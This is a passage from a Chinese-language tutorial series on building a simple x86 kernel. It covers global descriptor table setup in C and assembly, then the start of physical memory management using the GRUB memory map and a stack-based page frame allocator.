<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_GDT_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_GDT_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符类型  具体多少位 对应可以看上述的图 共8字节 64位</span></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdt_entry_t</span> &#123;</span></span><br><span class="line">	<span class="type">uint16_t</span> limit_low;     <span class="comment">// 段界限   15～0</span></span><br><span class="line">	<span class="type">uint16_t</span> base_low;      <span class="comment">// 段基地址 15～0</span></span><br><span class="line">	<span class="type">uint8_t</span>  base_middle;   <span class="comment">// 段基地址 23～16</span></span><br><span class="line">	<span class="type">uint8_t</span>  access;        <span class="comment">// 段存在位、描述符特权级、描述符类型、描述符子类别</span></span><br><span class="line">	<span class="type">uint8_t</span>  granularity; 	<span class="comment">// 其他标志、段界限 19～16</span></span><br><span class="line">	<span class="type">uint8_t</span>  base_high;     <span class="comment">// 段基地址 31～24</span></span><br><span class="line">&#125; __attribute__((packed)) <span class="type">gdt_entry_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GDTR  48位</span></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdt_ptr_t</span> &#123;</span></span><br><span class="line">	<span class="type">uint16_t</span> limit; 	<span class="comment">// 全局描述符表限长 16位</span></span><br><span class="line">	<span class="type">uint32_t</span> base; 		<span class="comment">// 全局描述符表 32位 基地址</span></span><br><span class="line">&#125; __attribute__((packed)) <span class="type">gdt_ptr_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化全局描述符表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_gdt</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GDT 加载到 GDTR 的函数[汇编实现]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">gdt_flush</span><span class="params">(<span class="type">uint32_t</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> 	<span class="comment">// INCLUDE_GDT_H_</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p><code>__attribute__((packed))</code></p>
<p> 是一个由GCC提供的特殊属性，用于指示编译器如何在内存中布局结构体或联合体的成员。使用这个属性可以<strong>确保编译器生成的数据结构不进行任何自动的内存对齐</strong>，而是严格按照成员声明的顺序将它们紧密地打包在一起。</p>
</blockquote>
<p><strong>函数实现</strong></p>
<blockquote>
<p>gdt&#x2F;gdt.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表长度</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDT_LENGTH 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表定义</span></span><br><span class="line"><span class="type">gdt_entry_t</span> gdt_entries[GDT_LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="comment">// GDTR</span></span><br><span class="line"><span class="type">gdt_ptr_t</span> gdt_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表构造函数，根据下标构造  参数 GDT表中索引， 段基地址， 段的大小限制， 段的类型 特权级等，段的颗粒度。 </span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">gdt_set_gate</span><span class="params">(<span class="type">int32_t</span> num, <span class="type">uint32_t</span> base, <span class="type">uint32_t</span> limit, <span class="type">uint8_t</span> access, <span class="type">uint8_t</span> gran)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明内核栈地址</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint32_t</span> <span class="built_in">stack</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化全局描述符表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_gdt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 全局描述符表界限 e.g. 从 0 开始，所以总长要 - 1</span></span><br><span class="line">	gdt_ptr.limit = <span class="keyword">sizeof</span>(<span class="type">gdt_entry_t</span>) * GDT_LENGTH - <span class="number">1</span>;</span><br><span class="line">	gdt_ptr.base = (<span class="type">uint32_t</span>)&amp;gdt_entries;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 采用 Intel 平坦模型   5个 gdt</span></span><br><span class="line">	gdt_set_gate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);             	<span class="comment">// 按照 Intel 文档要求，第一个描述符必须全 0</span></span><br><span class="line">	gdt_set_gate(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0x9A</span>, <span class="number">0xCF</span>); 	<span class="comment">// 指令段</span></span><br><span class="line">	gdt_set_gate(<span class="number">2</span>, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0x92</span>, <span class="number">0xCF</span>); 	<span class="comment">// 数据段</span></span><br><span class="line">	gdt_set_gate(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xFA</span>, <span class="number">0xCF</span>); 	<span class="comment">// 用户模式代码段</span></span><br><span class="line">	gdt_set_gate(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>); 	<span class="comment">// 用户模式数据段</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 加载全局描述符表地址到 GPTR 寄存器</span></span><br><span class="line">	gdt_flush((<span class="type">uint32_t</span>)&amp;gdt_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表构造函数，根据下标构造</span></span><br><span class="line"><span class="comment">// 参数分别是 数组下标、基地址、限长、访问标志，其它访问标志</span></span><br><span class="line"><span class="comment">/* 结构体定义如下：</span></span><br><span class="line"><span class="comment">typedef struct</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	uint16_t limit_low;     // 段界限   15～0</span></span><br><span class="line"><span class="comment">	uint16_t base_low;      // 段基地址 15～0</span></span><br><span class="line"><span class="comment">	uint8_t  base_middle;   // 段基地址 23～16</span></span><br><span class="line"><span class="comment">	uint8_t  access;        // 段存在位、描述符特权级、描述符类型、描述符子类别</span></span><br><span class="line"><span class="comment">	uint8_t  granularity; 	// 其他标志、段界限 19～16</span></span><br><span class="line"><span class="comment">	uint8_t  base_high;     // 段基地址 31～24</span></span><br><span class="line"><span class="comment">&#125; __attribute__((packed)) gdt_entry_t;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">gdt_set_gate</span><span class="params">(<span class="type">int32_t</span> num, <span class="type">uint32_t</span> base, <span class="type">uint32_t</span> limit, <span class="type">uint8_t</span> access, <span class="type">uint8_t</span> gran)</span></span><br><span class="line">&#123;</span><br><span class="line">	gdt_entries[num].base_low     = (base &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">	gdt_entries[num].base_middle  = (base &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">	gdt_entries[num].base_high    = (base &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">	gdt_entries[num].limit_low    = (limit &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">	gdt_entries[num].granularity  = (limit &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line"></span><br><span class="line">	gdt_entries[num].granularity |= gran &amp; <span class="number">0xF0</span>;</span><br><span class="line">	gdt_entries[num].access       = access;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>GDT_LENGTH 5</strong>  — 为什么是5</p>
<p>在典型的x86保护模式操作系统中，这些段通常包括：</p>
<ol>
<li><strong>空描述符（Null Descriptor）</strong>:<ul>
<li>按照Intel的规定，GDT的第一个条目必须是一个空描述符。这不是用于实际的内存段，但它有助于捕捉到无效的段选择器访问，因为任何尝试访问索引为0的描述符的操作都会导致异常。</li>
</ul>
</li>
<li><strong>内核代码段（Kernel Code Segment）</strong>:<ul>
<li>用于操作系统内核代码的执行。这通常是特权级0的代码段，只能由内核访问。</li>
</ul>
</li>
<li><strong>内核数据段（Kernel Data Segment）</strong>:<ul>
<li>用于操作系统内核数据。这也是特权级0的数据段。</li>
</ul>
</li>
<li><strong>用户代码段（User Code Segment）</strong>:<ul>
<li>用于用户模式程序的代码执行。这是特权级3的代码段，允许用户级应用程序执行。</li>
</ul>
</li>
<li><strong>用户数据段（User Data Segment）</strong>:<ul>
<li>用于用户模式程序的数据。这同样是特权级3的数据段。</li>
</ul>
</li>
</ol>
<p>定义这5个条目是为了确保操作系统能够正确区分内核模式和用户模式，同时处理用户程序和内核之间的权限切换。这种分隔是现代操作系统安全性和稳定性的关键，因为它防止了用户程序直接访问内核资源和其他敏感数据。</p>
<blockquote>
<p>gdt&#x2F;gdt_s.s</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[GLOBAL gdt_flush]</span><br><span class="line"></span><br><span class="line">gdt_flush:</span><br><span class="line">	mov eax, [esp+4]  ; 参数存入 eax 寄存器</span><br><span class="line">	lgdt [eax]        ; 加载到 GDTR [修改原先GRUB设置]</span><br><span class="line"></span><br><span class="line">	mov ax, 0x10      ; 加载我们的数据段描述符</span><br><span class="line">	mov ds, ax        ; 更新所有可以更新的段寄存器</span><br><span class="line">	mov es, ax</span><br><span class="line">	mov fs, ax</span><br><span class="line">	mov gs, ax</span><br><span class="line">	mov ss, ax</span><br><span class="line">	jmp 0x08:.flush   ; 远跳转，0x08是我们的代码段描述符</span><br><span class="line">			  ; 远跳目的是清空流水线并串行化处理器</span><br><span class="line">.flush:</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>获取参数并加载GDT</strong><ul>
<li><code>mov eax, [esp+4]</code>: 这条指令从栈中获取函数参数。在C语言调用汇编时，参数通常通过栈传递。<code>[esp+4]</code> 表示取栈指针 <code>esp</code> 向上偏移4个字节的位置的值（因为 <code>esp</code> 指向的是返回地址），这里保存的是传递给 <code>gdt_flush</code> 函数的参数，即新GDT的地址。</li>
<li><code>lgdt [eax]</code>: <code>lgdt</code> 是加载全局描述符表寄存器（GDTR）的指令。<code>[eax]</code> 表示使用 <code>eax</code> 寄存器中的地址来加载GDTR。这里的地址指向一个 <code>gdt_ptr</code> 结构，其中包含了GDT的长度和基址。</li>
</ul>
</li>
<li><strong>更新段寄存器</strong><ul>
<li><code>mov ax, 0x10</code>: 将16进制值 <code>0x10</code> 移动到 <code>ax</code> 寄存器。这个值是数据段的选择子（selector），在GDT中的偏移量。这通常指向GDT中的第二个条目（首个条目是空描述符），这里定义为内核数据段。</li>
<li><code>mov ds, ax</code>、<code>mov es, ax</code>、<code>mov fs, ax</code>、<code>mov gs, ax</code>、<code>mov ss, ax</code>: 这些指令将数据段选择子加载到所有数据段寄存器（<code>ds</code>, <code>es</code>, <code>fs</code>, <code>gs</code>, <code>ss</code>）。这样确保所有的段寄存器都指向正确的段描述符，对应新的GDT设置。</li>
</ul>
</li>
<li><strong>远跳转以更新代码段寄存器和清空流水线</strong><ul>
<li><code>jmp 0x08:.flush</code>: 执行一个远跳转到同一代码段中的<code>.flush</code>标签。<code>0x08</code> 是代码段的选择子（在GDT中的位置），这里通常指向GDT的第一个代码段描述符。<strong>远跳转不仅跳转到指定的代码段，还强制CPU清空预取队列和流水线，并且实际上更新了CPU的内部结构，使代码段寄存器（<code>cs</code>）与新的GDT同步。</strong></li>
<li><code>.flush:</code>: 这是远跳转的目标位置，紧跟着的 <code>ret</code> 指令会返回到调用 <code>gdt_flush</code> 的代码中。</li>
</ul>
</li>
</ol>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">// 在调用 gdt_flush 函数之前，调用者（可能是C语言的初始化代码）将参数（gdt_ptr 的地址）压入栈中，并调用 gdt_flush 函数。栈的结构大致如下：</span><br><span class="line"><span class="addition">+-----------------+   &lt;- ESP (栈指针)</span></span><br><span class="line">|   参数：&amp;gdt_ptr   |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   返回地址       |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   调用者的局部变量  |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   ...            |</span><br><span class="line"></span><br><span class="line">// 当 gdt_flush 函数被调用时，CPU自动将返回地址（即调用 gdt_flush 之后的下一条指令的地址）压入栈中。此时，ESP 指向栈中的返回地址。</span><br><span class="line"><span class="addition">+-----------------+   &lt;- ESP (新的栈指针位置)</span></span><br><span class="line">|   返回地址       |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   参数：&amp;gdt_ptr   |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   调用者的局部变量  |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   ...            |</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>修改 entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    </span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_blue, rc_red, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2024/05/10/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-3-%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8/image-20240510212154383.png" alt="image-20240510212154383"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-5-物理内存管理的实现</title>
    <url>/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="9-物理内存管理的实现"><a href="#9-物理内存管理的实现" class="headerlink" title="9.物理内存管理的实现"></a>9.物理内存管理的实现</h1><h2 id="9-1分页式的内存管理"><a href="#9-1分页式的内存管理" class="headerlink" title="9.1分页式的内存管理"></a>9.1分页式的内存管理</h2><img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513202714321.png" alt="image-20240513202714321" style="zoom:50%;">

<p>线性地址是连续的，<strong>但是其实际指向的 物理地址就不见得是连续的了</strong></p>
<img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513202919077.png" alt="image-20240513202919077" style="zoom:67%;">

<p>虚拟 内存实质上就是把物理内存中暂<strong>时用不到的内容暂时换出到外存里</strong>，空出内存放置现阶段 需要的数据。<strong>至于替换的策略当然有相应的算法了，比如最先换入原则，最少使用原则等 等方法可以使用</strong></p>
<p><strong>分级页表：</strong>以32位的地址来说，分为3段来寻址，分别是地址的低12位，中间10位和高10位。</p>
<ol>
<li>高 10位表示当前地址项在页目录中的偏移，最终偏移处指向对应的页表，</li>
<li>中间10位是当前地 址在该页表中的偏移，我们按照这个偏移就能查出来最终指向的物理页了，</li>
<li>最低的12位表 示当前地址在该物理页中的偏移</li>
</ol>
<img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513203948806.png" alt="image-20240513203948806" style="zoom:67%;">

<p><strong>本章主要解决一下三个问题：</strong></p>
<ol>
<li>如何获取可用物理内存的大小和地址？ </li>
<li>采用什么样的数据结构来描述物理内存？ </li>
<li>申请和释放物理内存的算法如何实现？</li>
</ol>
<h2 id="问题一：如何获取可用物理内存的大小和地址？"><a href="#问题一：如何获取可用物理内存的大小和地址？" class="headerlink" title="问题一：如何获取可用物理内存的大小和地址？"></a>问题一：如何获取可用物理内存的大小和地址？</h2><p>在GRUB中已经获取物理内存的分布，并且将它们放置下面的成员里</p>
<blockquote>
<p>include&#x2F;multiboot.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">typedef</span></span><br><span class="line"><span class="number">2</span> <span class="class"><span class="keyword">struct</span> <span class="title">multiboot_t</span> &#123;</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span> ... ...</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span> <span class="comment">/**</span></span><br><span class="line"><span class="comment">7 * 以下两项指出保存由 BIOS 提供的内存分布的缓冲区的地址和长度</span></span><br><span class="line"><span class="comment">8 * mmap_addr 是缓冲区的地址， mmap_length 是缓冲区的总大小</span></span><br><span class="line"><span class="comment">9 * 缓冲区由一个或者多个下面的 mmap_entry_t 组成</span></span><br><span class="line"><span class="comment">10 */</span></span><br><span class="line"><span class="number">11</span> <span class="type">uint32_t</span> mmap_length;</span><br><span class="line"><span class="number">12</span> <span class="type">uint32_t</span> mmap_addr;</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span> ... ...</span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="number">16</span> &#125; __attribute__((packed)) <span class="type">multiboot_t</span>;</span><br><span class="line"><span class="number">17</span></span><br><span class="line"><span class="number">18</span> <span class="comment">/**</span></span><br><span class="line"><span class="comment">19 * size 是相关结构的大小，单位是字节，它可能大于最小值 20</span></span><br><span class="line"><span class="comment">20 * base_addr_low 是启动地址的低位，32base_addr_high 是高 32 位，启动地址总共有 64 位</span></span><br><span class="line"><span class="comment">21 * length_low 是内存区域大小的低位，32length_high 是内存区域大小的高 32 位，总共是 64 位</span></span><br><span class="line"><span class="comment">22 * type 是相应地址区间的类型，1 代表可用，所有其它的值代表保留区域 RAM</span></span><br><span class="line"><span class="comment">23 */</span></span><br><span class="line"><span class="number">24</span> <span class="keyword">typedef</span></span><br><span class="line"><span class="number">25</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmap_entry_t</span> &#123;</span></span><br><span class="line"><span class="number">26</span> <span class="type">uint32_t</span> size; <span class="comment">// size 是不含 size 自身变量的大小</span></span><br><span class="line"><span class="number">27</span> <span class="type">uint32_t</span> base_addr_low;</span><br><span class="line"><span class="number">28</span> <span class="type">uint32_t</span> base_addr_high;</span><br><span class="line"><span class="number">29</span> <span class="type">uint32_t</span> length_low;</span><br><span class="line"><span class="number">30</span> <span class="type">uint32_t</span> length_high;</span><br><span class="line"><span class="number">31</span> <span class="type">uint32_t</span> type;</span><br><span class="line"><span class="number">32</span> &#125; __attribute__((packed)) <span class="type">mmap_entry_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>GRUB将内存探测的结果按<strong>每个分段整理为mmap_entry结构体的数组</strong>。<strong>mmap_addr是这 个结构体数组的首地址，mmap_length是整个数组的长度。</strong></p>
<blockquote>
<p>mm&#x2F;pmm.c 打印所有物理内存段的操作：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;multiboot.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_memory_map</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> mmap_addr = glb_mboot_ptr-&gt;mmap_addr;</span><br><span class="line">    <span class="type">uint32_t</span> mmap_length = glb_mboot_ptr-&gt;mmap_length;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;Memory map:\n&quot;</span>);</span><br><span class="line">    <span class="comment">// mmap_addr是数组的起始地址 首地址  mmaplength 是长度</span></span><br><span class="line">    <span class="type">mmap_entry_t</span> *mmap = (<span class="type">mmap_entry_t</span> *)mmap_addr;</span><br><span class="line">    <span class="keyword">for</span> (mmap = (<span class="type">mmap_entry_t</span> *)mmap_addr; (<span class="type">uint32_t</span>)mmap &lt; mmap_addr + mmap_length; mmap++) &#123;</span><br><span class="line">        printk(<span class="string">&quot;base_addr = 0x%X%08X, length = 0x%X%08X, type = 0x%X\n&quot;</span>,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;base_addr_high , (<span class="type">uint32_t</span>)mmap-&gt;base_addr_low ,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;length_high , (<span class="type">uint32_t</span>)mmap-&gt;length_low ,</span><br><span class="line">        (<span class="type">uint32_t</span>)mmap-&gt;type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>script&#x2F;kernel.ld</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PROVIDE( kern_start = . );  // 加上这两个变量</span><br><span class="line">.text :</span><br><span class="line">&#123;</span><br><span class="line">	*(.text)</span><br><span class="line">	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">.data :</span><br><span class="line">&#123;</span><br><span class="line">	*(.data)</span><br><span class="line">	*(.rodata)</span><br><span class="line">	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">.bss :</span><br><span class="line">&#123;</span><br><span class="line">	*(.bss)</span><br><span class="line">	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">.stab :</span><br><span class="line">&#123;</span><br><span class="line">	*(.stab)</span><br><span class="line">	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">.stabstr :</span><br><span class="line">&#123;</span><br><span class="line">	*(.stabstr)</span><br><span class="line"> 	. = ALIGN(4096);</span><br><span class="line">&#125;</span><br><span class="line">PROVIDE( kern_end = . ); // 加上这两个变量</span><br></pre></td></tr></table></figure>

<p>需要知道内核本身加载到物理内存的信息，通过链接器脚本</p>
<blockquote>
<p>添加头文件 include&#x2F;pmm.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_PMM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_PMM_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;multiboot.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核文件在内存中的起始和结束位置</span></span><br><span class="line"><span class="comment">// 在连接器脚本中定义了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint8_t</span> kern_start[];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint8_t</span> kern_end[];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出bios提供的物理内存布局</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_memory_map</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// INCLUDE</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>修改入口代码 init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    init_timer(<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// `sti` 指令的作用是设置中断标志（Set Interrupt Flag）</span></span><br><span class="line">    <span class="comment">// asm volatile(&quot;sti&quot;);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示物理内存布局</span></span><br><span class="line">    printk(<span class="string">&quot;kernel in memory start: 0x%08X\n&quot;</span>, kern_start);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory end: 0x%08X\n&quot;</span>, kern_end);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory used: %d KB\n\n&quot;</span>, (kern_end - kern_start + <span class="number">1023</span>) / <span class="number">1024</span>); <span class="comment">// 换算成kb</span></span><br><span class="line"></span><br><span class="line">    show_memory_map();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可用内存是两段 type1 表示ram可用内存，是1MB以下的0x0-0x9FC00和1M以上的0x100000-0x7EFE000两段。</p>
<p>本身的内核程序起始位置是 0x100000（1MB）  占用的内存大小为84KB</p>
<img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513213039330.png" alt="image-20240513213039330" style="zoom:150%;">



<h2 id="问题二：采用什么样的数据结构来描述物理内存？"><a href="#问题二：采用什么样的数据结构来描述物理内存？" class="headerlink" title="问题二：采用什么样的数据结构来描述物理内存？"></a>问题二：采用什么样的数据结构来描述物理内存？</h2><blockquote>
<p>物理内存管理法— 伙伴算法：伙伴算法在申请和释放物理页框的时候会<strong>对物理页框进行合并操作，尽可能的 保证可用物理内存的连续性。</strong></p>
<ul>
<li>内部碎片：内部碎片就是已经被分配出去却不能被利用的内存空间，比如我们为了管理 方便，按照4KB内存块进行管理</li>
<li>外部碎片：内存频繁请求和释放大小不同的连续页框后，导致在已分配页框块周围分散了许多小 块空闲的页框，尽管这些空闲页框的总数可以满足接下来的请求，但却无法满足一个大块 的连续页框。</li>
</ul>
</blockquote>
<p>本项目涉及的内存管理方法：将物理页面的管理地址设定在1MB以上内核加载的结束位置之后，<strong>从这个起始位置到512MB的地址处将所有的物理内存按页划分， 将每页的地址放入栈里存储</strong>。这样在需要的时候就可以按页获取到物理内存了  — 通过栈实现</p>
<p><strong>主要的步骤</strong>：</p>
<ol>
<li>(kern_end - kern_start)内核加载完的结束位置到512MB的位置按照一个页4KB的大小划分页框</li>
<li>将页框依次压入栈中 — 每个页框的地址都会被记录下来</li>
<li>当需要分配使用物理内存的时候，弹出相应大小的页框地址</li>
<li>当系统释放内存的时候，将页框重新压入栈中</li>
</ol>
<p><strong>示例：</strong></p>
<p>假设内核加载结束位置是2MB（0x200000），那么从2MB到512MB的范围内的所有内存按4KB页框划分。栈中存储的地址可能依次是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00200000, 0x00201000, 0x00202000, ..., 0x1FFFE000</span><br></pre></td></tr></table></figure>

